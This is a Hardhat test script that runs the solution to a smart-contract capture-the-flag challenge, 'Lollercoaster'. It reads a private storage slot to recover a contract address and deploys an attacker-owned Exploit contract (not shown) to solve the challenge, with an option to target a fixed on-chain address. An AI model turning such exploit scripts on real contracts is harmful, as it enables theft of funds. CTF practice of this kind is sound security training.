import { expect } from "chai";
import hre, { ethers } from "hardhat";

import { Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

describe("Sherlock CTF: Lollercoaster (iflp)", () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  let setup: Contract;
  let quiz: Contract;

  before(async () => {
    [deployer, attacker] = await ethers.getSigners();

    if (hre.network.name === "hardhat") {
      const SetupFactory = await ethers.getContractFactory("contracts/iflp/Setup.sol:Setup", deployer);
      setup = await SetupFactory.deploy({ value: ethers.utils.parseEther("1") });

      const LollercoasterFactory = await ethers.getContractFactory("Lollercoaster", deployer);
      quiz = await ethers.getContractAt(
        "contracts/iflp/ExampleQuizExploit.sol:ExampleQuizExploit",
        await setup.instance(),
        deployer
      );
      const lollercoaster = await LollercoasterFactory.deploy();
      await quiz.initialize(lollercoaster.address);
    } else {
      setup = await ethers.getContractAt(
        "contracts/iflp/Setup.sol:Setup",
        `0x38B500E61267Ee672c823bE3a8fA559236Bd1FD3`
      );
      quiz = await ethers.getContractAt(
        "contracts/iflp/ExampleQuizExploit.sol:ExampleQuizExploit",
        await setup.instance(),
        deployer
      );
    }
  });

  it("Exploit", async () => {
    // Contract Attack
    let lollercoaster_address = await ethers.provider.getStorageAt(quiz.address, 0);
    lollercoaster_address = `0x${lollercoaster_address.slice(-40)}`;

    const ExploitFactory = await ethers.getContractFactory("contracts/iflp/Exploit.sol:Exploit", attacker);
    await ExploitFactory.deploy(quiz.address, lollercoaster_address, { value: ethers.utils.parseEther("1") });
  });

  after(async () => {
    expect(await setup.isSolved()).to.be.true;
  });
});
